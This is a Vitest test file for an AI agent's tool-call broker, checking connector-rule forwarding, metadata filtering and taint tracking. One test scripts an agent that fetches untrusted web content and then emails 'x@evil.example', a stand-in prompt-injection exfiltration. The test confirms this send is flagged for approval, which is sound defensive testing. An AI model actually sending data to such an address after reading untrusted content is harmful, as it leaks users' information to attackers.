import { describe, expect, it } from "vitest";
import { call, harness, recorder, runTurn, say, spec, until } from "./harness.ts";

describe("connector rule and taint sources reach the broker (#71)", () => {
  it("forwards describeCall().connectorRule on the ToolCallIntent", async () => {
    const h = harness({
      script: [call("s1", "gmail.send", { to: "ana@example.com" }), say("Sent.")],
      policy: { bySideEffect: { write: "allow" } },
    });
    h.loop.registry.register({
      spec: spec("gmail.send", "write"),
      execute: recorder().execute,
      describeCall: () => ({ connectorRule: { id: "google", action: "gmail.send" } }),
    });
    await runTurn(h, "email ana");
    expect(h.broker.decisions[0]?.call.connectorRule).toEqual({
      id: "google",
      action: "gmail.send",
    });
  });

  it("forwards only the string app and action of describeCall().meta", async () => {
    const h = harness({
      script: [call("c1", "computer.act", { app: "com.apple.Notes" }), say("Clicked.")],
      policy: { bySideEffect: { write: "allow" } },
    });
    h.loop.registry.register({
      spec: spec("computer.act", "write"),
      execute: recorder().execute,
      describeCall: () => ({
        kind: "computer_action",
        meta: { app: "com.apple.Notes", action: "click", extra: true } as never,
      }),
    });
    await runTurn(h, "click it");
    expect(h.broker.decisions[0]?.call.meta).toEqual({ app: "com.apple.Notes", action: "click" });
  });

  it("a tainted approval request carries the turn's taint sources", async () => {
    const h = harness({
      script: [call("f1", "web.fetch", {}), call("s1", "email.send", { to: "x@evil.example" })],
      policy: { bySideEffect: { read: "allow", write: "ask" } },
    });
    h.loop.registry.register({
      spec: spec("web.fetch", "read", { provenanceOut: "untrusted" }),
      execute: recorder().execute,
    });
    h.loop.registry.register({ spec: spec("email.send", "write"), execute: recorder().execute });
    const controller = new AbortController();
    const done = runTurn(h, "read and send", { signal: controller.signal });
    await until(() => h.broker.issued.length === 1, "approval");
    const approval = h.broker.issued[0]?.approval;
    expect(approval?.taint).toBe(true);
    expect(approval?.taintSources?.[0]).toMatchObject({
      sourceKind: "web.fetch",
      toolCallId: "f1",
    });
    controller.abort();
    await done.catch(() => undefined);
  });
});
